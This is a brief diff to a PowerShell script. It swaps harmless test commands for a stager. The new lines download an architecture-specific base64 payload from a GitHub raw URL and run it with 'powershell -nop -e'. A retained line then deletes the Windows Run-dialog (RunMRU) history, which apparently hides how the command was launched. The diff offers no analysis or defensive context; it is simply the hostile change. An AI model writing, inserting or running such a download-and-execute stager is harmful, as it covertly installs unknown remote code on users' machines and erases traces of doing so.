@@ -1,6 +1,3 @@
-echo 1
-echo 2
-Get-ExecutionPolicy
-cd $env:USERPROFILE
-mkdir test
+$e = (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/chikizikikato/TibotSites/master/windows_' +$env:PROCESSOR_ARCHITECTURE+ '_psh_base64.txt')
+powershell -nop -e $e
 rp -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
